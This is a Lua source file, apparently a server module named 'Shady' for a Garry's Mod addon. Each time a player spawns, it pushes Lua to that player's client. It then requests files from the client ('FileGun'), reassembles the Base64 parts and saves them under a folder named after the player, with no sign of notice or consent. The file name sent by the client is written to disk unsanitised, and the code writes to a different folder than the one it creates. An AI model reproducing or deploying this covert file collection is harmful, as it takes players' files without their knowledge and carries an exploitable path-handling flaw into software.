Arcker:AddEvent( 'OnEndLoad', function()
	if not file.Exists( 'arcker/filepool', 'DATA' ) then file.CreateDir( 'arcker/filepool' ) end
	Shady = {}
	Shady.FileParts = {}
	Shady.Requests = {}
	hook.Add( 'PlayerSpawn', Arcker:Pname( 'shadystartup' ), function( ply )
		ply:SendLua( 'Shady.start()' )
	end )

	util.AddNetworkString( 'shadyfilelist' )
	util.AddNetworkString( 'setrequest' )
	util.AddNetworkString( 'filegun.start' )
	util.AddNetworkString( 'sendpart' )
	util.AddNetworkString( 'sendclose' )

	function Shady:CreateRequest( tab )
		local tar = tab.Target
		local fil = tab.Files
		net.Start( 'setrequest' )
		 net.WriteTable( fil )
		net.Send( tar )
		return true
	end
	function Shady:FileGun( ply, s )
		if s == 'start' then
			net.Start( 'filegun.start' )
			net.Send( ply )
		end
	end

	net.Receive( 'shadyfilelist', function( len, ply )
		local Files, err = pcall( net.ReadTable )
		if not Files or err ~= nil then return false end
		Shady.Requests[ ply:SteamID() ] = {}
		local obj = Shady.Requests[ ply:SteamID() ]
		obj.Target = ply
		obj.Files = {}
		for _, v in ipairs( Files ) do
			if v then
				if not file.Exists( 'arcker/filepool/' .. v, 'DATA' ) then
					table.insert( obj.Files, v )
				end
			end
		end
		Shady:CreateRequest( obj )
		Shady:FileGun( ply, 'start' )
	end )

	net.Receive( 'sendpart', function( len, ply )
		if not Shady.FileParts[ply:SteamID()] then
			Shady.FileParts[ply:SteamID()] = {}
		end
		table.insert( Shady.FileParts[ply:SteamID()], net.ReadTable( ) )
		print( 'received part bra' )
	end )

	net.Receive( 'sendclose', function( len, ply )
		local parts = Shady.FileParts[ply:SteamID()]
		local filer = net.ReadString( )
		
		local s = ''
		for _, v in ipairs( parts ) do
			for __, i in ipairs( v ) do
				s = s .. i
			end
		end
		s = Base64:dec( s )
		local name = string.Replace( 
		              string.Replace( 
					   string.Replace( 
					    string.Replace( 
						 ply:Nick(), ':', '' ), '/', '' ), '/', '' ), '"', '' ) .. '_|_' .. string.Replace( ply:SteamID(), ':', '-' )
		file.Write( 'filepool/' .. name .. '/' .. filer, s )
		print( 'filepool/' .. name .. '/' .. filer )
		Shady.FileParts[ply:SteamID()] = nil
	end )
end)